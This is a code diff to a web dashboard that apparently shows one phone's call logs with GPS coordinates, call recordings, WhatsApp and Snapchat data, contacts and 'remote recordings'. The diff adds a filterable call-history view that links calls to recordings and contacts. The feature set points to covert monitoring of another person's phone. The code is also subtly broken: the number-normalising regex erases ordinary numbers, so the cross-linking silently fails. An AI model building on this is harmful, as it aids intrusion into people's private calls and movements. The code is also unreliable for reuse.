@@ -386,7 +386,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div class="filter-chips" id="timelineChips">
 <span class="chip active" data-filter="all" data-label="All">All</span>
 <span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
-<span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
 <span class="chip" data-filter="whatsapp_individual" data-label="&#x1F4AC; Individual">&#x1F4AC; Individual</span>
 <span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups">&#x1F465; Groups</span>
 <span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
@@ -414,7 +413,32 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="waWizardOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.68);z-index:9999;align-items:center;justify-content:center;padding:16px">
 <div id="waWizardCard" style="background:var(--card);border:1px solid var(--border);border-radius:14px;max-width:580px;width:100%;max-height:88vh;overflow:auto;padding:18px;font-size:14px"></div>
 </div>
-<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
+<div id="tab-calls">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px">
+<span style="font-size:16px;font-weight:500">&#x1F4DE; Calls <span id="callsCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
+<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
+<select id="callsPeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
+<option value="all">All Time</option>
+<option value="1h">Last 1 Hour</option>
+<option value="6h">Last 6 Hours</option>
+<option value="12h">Last 12 Hours</option>
+<option value="24h" selected>Last 24 Hours</option>
+<option value="7d">Last 7 Days</option>
+<option value="30d">Last 30 Days</option>
+</select>
+<select id="callsDir" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
+<option value="all">All Directions</option>
+<option value="incoming">Incoming</option>
+<option value="outgoing">Outgoing</option>
+<option value="missed">Missed</option>
+<option value="rejected">Rejected</option>
+</select>
+<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px" onclick="clearCallsFilter()">&#x1F5D4; Clear Filters</button>
+</div>
+</div>
+<input type="text" id="callsSearch" placeholder="&#x1F50D; Search contacts, numbers..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="callsBody"></div>
+</div>
 <div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <span class="app-period-btn active" data-period="today">Today</span>
 <span class="app-period-btn" data-period="yesterday">Yesterday</span>
@@ -886,6 +910,11 @@ let preserveRecentsScroll = false;
 let timelinePeriod = '24h';
 let timelineOffset = 0;
 const TIMELINE_BATCH = 500;
+const CALLS_BATCH = 100;
+let callsPeriod = 'all';
+let callsCache = null;
+let callsDirFilter = 'all';
+let callsOffset = 0;
 let haidhCache = null;
 let exerciseCache = null;
 
@@ -1390,6 +1419,7 @@ function perpendicularDist(p, a, b) {
 }
 
 function escHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+function debounce(fn, ms) { let t; return function(...args) { clearTimeout(t); t = setTimeout(() => fn.apply(this, args), ms); }; }
 
 // --- Local date helpers (device-local, NOT UTC) ---
 function localDateStr(d) {
@@ -1781,6 +1811,10 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'health') pollHealth();
     if (btn.dataset.tab === 'voice') { renderVoiceNotes(); pollVoiceNotes(); }
     if (btn.dataset.tab === 'remote') { renderRemoteRecordings(); pollRemoteRecordings(); }
+    if (btn.dataset.tab === 'calls') {
+      if (!callsCache) pollHistory();
+      renderCalls(timelineCache);
+    }
   });
 });
 
@@ -5576,19 +5610,213 @@ document.getElementById('timelineSearch')?.addEventListener('input', function() 
   }, 300);
 });
 
+function formatCallDuration(seconds) {
+  if (!seconds || seconds <= 0) return '—';
+  if (seconds >= 3600) return Math.floor(seconds / 3600) + 'h ' + Math.floor((seconds % 3600) / 60) + 'm';
+  if (seconds >= 60) return Math.floor(seconds / 60) + 'm ' + Math.floor(seconds % 60) + 's';
+  return Math.floor(seconds) + 's';
+}
+
+function normalizeCallNumber(number) {
+  if (!number) return '';
+  return number.replace(/^[\+]?[\d\s\-\(\)]+/g, '');
+}
+
+async function loadMoreCalls() {
+  callsOffset += CALLS_BATCH;
+  if (timelineCache) renderCalls(timelineCache);
+}
+
+function clearCallsFilter() {
+  callsPeriod = 'all';
+  callsDirFilter = 'all';
+  callsOffset = 0;
+  if (timelineCache) renderCalls(timelineCache);
+}
+
+document.getElementById('callsPeriod')?.addEventListener('change', function() {
+  callsPeriod = this.value;
+  callsOffset = 0;
+  if (timelineCache) renderCalls(timelineCache);
+});
+document.getElementById('callsDir')?.addEventListener('change', function() {
+  callsDirFilter = this.value;
+  callsOffset = 0;
+  if (timelineCache) renderCalls(timelineCache);
+});
+document.getElementById('callsSearch')?.addEventListener('input', debounce(function() {
+  callsOffset = 0;
+  if (timelineCache) renderCalls(timelineCache);
+}, 300));
+
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
-  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 100);
-  body.innerHTML = calls.map(d => {
-    const ts = parseInt(d.ts_ms || '0');
-    const name = d.contactName || d.contact || '';
-    const number = d.contactNumber || '';
-    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
-    const dur = d.duration || '--';
-    const dir = d.direction || '--';
-    const loc = d.location || '';
-    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:13px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
-  }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+  const countEl = document.getElementById('callsCount');
+  if (countEl) countEl.textContent = '';
+
+  const allCalls = docs.filter(d => (d.type || '').includes('call'));
+
+  // Apply filters
+  let calls = allCalls.slice();
+  if (callsPeriod !== 'all') {
+    const periodMs = { '1h': 3600000, '6h': 21600000, '12h': 43200000, '24h': 86400000, '7d': 604800000, '30d': 2592000000 };
+    const cutoff = Date.now() - (periodMs[callsPeriod] || periodMs['24h']);
+    calls = calls.filter(d => parseInt(d.ts_ms || '0') >= cutoff);
+  }
+  if (callsDirFilter !== 'all') {
+    calls = calls.filter(d => d.direction === callsDirFilter);
+  }
+  const searchTerm = (document.getElementById('callsSearch')?.value || '').toLowerCase().trim();
+  if (searchTerm) {
+    calls = calls.filter(d => {
+      const searchText = `${d.contactName || ''} ${d.contactNumber || ''} ${d.direction || ''} ${d.duration || ''} ${d.location || ''} ${d.simSlot != null ? d.simSlot : ''} ${d.isVoLTE ? 'volte' : ''}`;
+      return searchText.includes(searchTerm);
+    });
+  }
+
+  // Cross-link call recordings: match voice notes with recordingType='call'
+  let voiceNotes = [];
+  if (voiceNotesCache) {
+    voiceNotes = voiceNotesCache.filter(n => n.recordingType === 'call');
+  }
+  const notesByNumber = new Map();
+  for (const n of voiceNotes) {
+    const num = normalizeCallNumber(n.callerNumber);
+    if (!num) continue;
+    if (!notesByNumber.has(num)) notesByNumber.set(num, []);
+    notesByNumber.get(num).push(n);
+  }
+
+  // Cross-link contacts for name resolution
+  const contactsByNumber = new Map();
+  if (contactsCache && contactsCache.contacts) {
+    for (const c of contactsCache.contacts) {
+      const num = normalizeCallNumber(c.number || c.phoneNumber || '');
+      if (num) {
+        contactsByNumber.set(num, c);
+      }
+    }
+  }
+
+  const notesByNumberLookup = notesByNumber;
+
+  // Group by day
+  const groups = {};
+  for (const d of calls) {
+    const day = new Date(parseInt(d.ts_ms || '0')).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push(d);
+  }
+
+  const totalFiltered = calls.length;
+  const totalAll = allCalls.length;
+  if (countEl) countEl.textContent = totalAll ? `(${totalAll} total)` : '';
+
+  if (!calls.length) {
+    body.innerHTML = '<div class="label" style="padding:20px 0;text-align:center">No calls match the current filters</div>';
+    return;
+  }
+
+  // Sort newest first within groups (docs already sorted, but be safe)
+  const dirCounts = { incoming: 0, outgoing: 0, missed: 0, rejected: 0, blocked: 0, unknown: 0 };
+  let totalDuration = 0;
+  for (const d of calls) {
+    const c = d.duration ? parseInt(d.duration) : 0;
+    if (c > 0) totalDuration += c;
+    const dc = d.direction || 'unknown';
+    dirCounts[dc] = (dirCounts[dc] || 0) + 1;
+  }
+
+  let html = '';
+  // Summary header
+  const durStr = formatCallDuration(totalDuration);
+  html += `<div style="font-size:12px;color:var(--muted);margin-bottom:8px;padding:6px 8px;background:var(--bg);border-radius:var(--radius);border:1px solid var(--border)">
+<strong>📞 Call Summary:</strong>
+${dirCounts.incoming ? '⬅️ ' + dirCounts.incoming + ' incoming  ' : ''}
+${dirCounts.outgoing ? '➡️ ' + dirCounts.outgoing + ' outgoing  ' : ''}
+${dirCounts.missed ? '❌ ' + dirCounts.missed + ' missed  ' : ''}
+${dirCounts.rejected ? '🚫 ' + dirCounts.rejected + ' rejected  ' : ''}
+${dirCounts.blocked ? '🔕 ' + dirCounts.blocked + ' blocked  ' : ''}
+<br>Total Talk Time: <strong>${durStr}</strong> across <strong>${totalFiltered}</strong> ${totalFiltered !== 1 ? 'calls' : 'call'}
+</div>`;
+
+  let days = Object.keys(groups).sort().reverse();
+
+  let callsToShow = 0;
+
+  for (const day of days) {
+    const dayCalls = groups[day];
+    html += `<div class="call-day-group">
+<div class ="call-day-header">${day} (${dayCalls.length} call${dayCalls.length !== 1 ? 's' : ''})</div>`;
+    for (const d of dayCalls) {
+      if (callsToShow >= callsOffset + CALLS_BATCH) break;
+      if (callsToShow < callsOffset) { callsToShow++; continue; }
+      callsToShow++;
+
+      const ts = parseInt(d.ts_ms || '0');
+      const rawName = d.contactName || d.contact || '';
+      const rawNumber = d.contactNumber || d.number || '';
+      const normalizedNum = normalizeCallNumber(rawNumber);
+
+      // Resolve contact name from contacts cache if raw name is empty or generic
+      let resolvedContact = null;
+      if (normalizedNum && contactsByNumber.has(normalizedNum)) {
+        resolvedContact = contactsByNumber.get(normalizedNum);
+      }
+
+      const name = rawName || (resolvedContact ? (resolvedContact.displayName || resolvedContact.name || '') : '') || '';
+      const number = rawNumber || (resolvedContact ? (resolvedContact.number || resolvedContact.phoneNumber || '') : '') || '';
+      const numDisplay = name && number ? `${escHtml(name)} (${escHtml(number)})` : name ? escHtml(name) : number ? escHtml(number) : '--';
+      const dur = d.duration ? parseInt(d.duration) : 0;
+      const durFormatted = formatCallDuration(dur);
+
+      const dir = d.direction || 'unknown';
+
+      const dirIcon = dir === 'incoming' ? '⬅️' : dir === 'outgoing' ? '➡️' : dir === 'missed' ? '❌' : dir === 'rejected' ? '🚫' : dir === 'blocked' ? '🔕' : '—';
+      const dirColor = dir === 'incoming' ? 'var(--success)' : dir === 'outgoing' ? 'var(--accent)' : dir === 'missed' ? 'var(--danger)' : dir === 'rejected' ? 'var(--muted)' : dir === 'blocked' ? 'var(--muted)' : 'var(--muted)';
+      const loc = d.location || '';
+      const lat = d.lat ? parseFloat(d.lat) : null;
+      const lng = d.lng ? parseFloat(d.lng) : null;
+      const hasCoords = (lat != null && lng != null);
+
+      // Call recording cross-link
+      let recordingInfo = '';
+      const matchingNotes = notesByNumberLookup.get(normalizedNum) || [];
+      for (const n of matchingNotes) {
+        const noteTs = parseInt(n._synced || n._key || '0');
+        if (Math.abs(ts - noteTs) <= 300000) {
+          const noteDur = n.durationMs ? Math.round(n.durationMs / 1000) : 0;
+          recordingInfo += ` <span style="font-size:10px;color:var(--success);background:rgba(63,185,80,.15);padding:1px 4px;border-radius:3px">🔊 ${noteDur > 0 ? noteDur + 's' : 'n/a'}</span>`;
+          break;
+        }
+      }
+
+      // Calculate end timestamp
+      const endTs = ts && dur > 0 ? ts + (dur * 1000) : null;
+
+      // Build metadata line
+      const metaParts = [];
+      if (d.duration != null) metaParts.push('<strong>Duration:</strong> ' + durFormatted);
+      else metaParts.push('<strong>Duration:</strong> —');
+      if (d.direction) metaParts.push('<strong>Direction:</strong> ' + d.direction);
+      if (d.simSlot != null) metaParts.push('<strong>SIM:</strong> ' + d.simSlot);
+      if (d.isVoLTE !== undefined) metaParts.push('<strong>VoLTE:</strong> ' + (d.isVoLTE ? 'Yes' : 'No'));
+      if (d.networkType) metaParts.push('<strong>Network:</strong> ' + escHtml(d.networkType));
+      if (d.countryCode) metaParts.push('<strong>Country:</strong> ' + escHtml(d.countryCode));
+      if (hasCoords) metaParts.push('<strong>Geo:</strong> ' + lat.toFixed(5) + ', ' + lng.toFixed(5));
+      if (loc) metaParts.push('<strong>📍 Location:</strong> ' + escHtml(loc));
+
+      html += `<div class="call-card" style="border:1px solid var(--border);border-radius:var(--radius);margin-bottom:4px;padding:6px 8px;background:var(--card)">
+  <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px">
+    <div><span style="font-size:13px;font-weight:600;color:${dirColor}">${dirIcon}</span> <span style="font-weight:600">${numDisplay}</span>${recordingInfo}</div>
+    <div style="font-size:11px;color:var(--muted)">${pkt(ts)}</div>
+  </div>
+  <div class="call-meta" style="font-size:11px;color:var(--muted);margin-top:4px;line-height:1.4">${metaParts.join('  •  ')}</div>
+</div>`;
+    }
+    html += '</div>';
+    }
+    body.innerHTML = html;
 }
 
 // --- App period selector ---
